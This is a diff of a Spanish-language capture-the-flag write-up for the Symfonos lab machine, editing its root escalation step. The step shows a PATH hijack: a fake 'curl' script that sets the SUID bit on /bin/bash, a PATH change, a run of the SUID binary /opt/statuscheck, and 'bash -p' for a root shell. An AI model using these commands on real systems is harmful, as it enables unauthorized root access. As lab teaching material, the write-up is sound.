@@ -215,14 +215,15 @@ vemos que el archivo esta haciendo un llamado al comando `curl` pero lo esta hac
 `Root`
 
 ```python
-> echo "chmod u+s /bin/bash" > curl
+> echo "chmod u+s /bin/bash" > curl 
+
 > chmod +x curl 
+
 > export PATH=/tmp:$PATH
-helios@symfonos:/tmp$ /opt/statuscheck
-helios@symfonos:/tmp$ bash -p
-bash-4.4# whoami
-root
-bash-4.4# 
+
+> /opt/statuscheck
+
+> bash -p
 
 ```
 
